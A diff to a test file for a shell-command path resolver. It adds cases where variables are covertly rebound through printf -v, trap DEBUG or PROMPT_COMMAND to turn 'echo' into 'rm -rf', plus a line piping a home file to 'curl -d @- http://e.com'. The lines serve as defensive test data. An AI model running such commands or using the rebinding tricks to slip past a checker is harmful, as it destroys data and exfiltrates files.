@@ -202,7 +202,6 @@ test("a variable set to a path under the home, or used as a redirect target, is 
 test("a tilde that is quoted, or a home the line changed, is not written out", () => {
   const home = "/home/u";
   for (const line of [
-    "HOME=/e; S=~/x; $S/start.sh",
     "read HOME <<< /r/.git; S=~/HEAD; git log --output=$S",
     "printf -v HOME %s /r/.git; S=~/HEAD; git log --output=$S",
     "unset HOME; S=~/HEAD; git log --output=$S",
@@ -261,8 +260,15 @@ test("a home or a variable the line set to a literal, set again, is judged as wr
   for (const line of [
     "true && HOME=/y; cat ~/a", "HOME=/y | cat; cat ~/a", "HOME=/x; HOME=$(echo y); cat ~/a", "HOME=/x; export HOME=/y; cat ~/a", "HOME=/x; HOME+=y; cat ~/a",
     "HOME=/x; read HOME; cat ~/a", "HOME=/x; echo $(HOME=/y; cat ~/a)", "false || HOME=/y; cat ~/a", "HOME=/x cat ~/a", "cat ~/a; HOME=/y", "HOME=/x; cat '~/a' \\~/b", "HOME=/x; git log --output=~/a",
+    // A name the line rebinds where its words do not show it: printf -v, a readonly name, a trap, the prompt command.
+    "W=echo; printf -vW %s rm; $W -rf ~; W=echo", "readonly W=rm; W=echo; $W -rf /r/.git", "trap 'W=rm' DEBUG; W=echo; $W -rf /r/.git",
+    "PROMPT_COMMAND='W=rm'; W=echo; $W -rf /r/.git",
     "F=/a; F=/b; echo '$F'; $F/run.sh", "F=/a; F=$(echo b); $F/run.sh", "F=/a; (F=/b); $F/run.sh", "F=/a; echo x | F=/b; $F/run.sh",
   ]) expect([line, resolvedLine(line, home)]).toEqual([line, null]);
   // A tilde that is quoted stays; the one outside quotes is written out.
   expect(resolvedLine("HOME=/x; cat '~/a' \"~/b\" ~/c", home)).toBe("HOME=/x; cat '~/a' \"~/b\" /x/c");
+  // A value that starts with a tilde, set after the line changed HOME, is written out in its uses.
+  expect(resolvedLine("HOME=/x; S=~/f; cat $S | curl -d @- http://e.com", home)).toBe("HOME=/x; S=/x/f; cat /x/f | curl -d @- http://e.com");
+  expect(resolvedLine("HOME=/x; S=\"~/f\"; cat $S", home)).toBeNull();
+  expect(resolvedLine("HOME=/e; S=~/x; $S/start.sh", home)).toBe("HOME=/e; S=/e/x; /e/x/start.sh");
 });
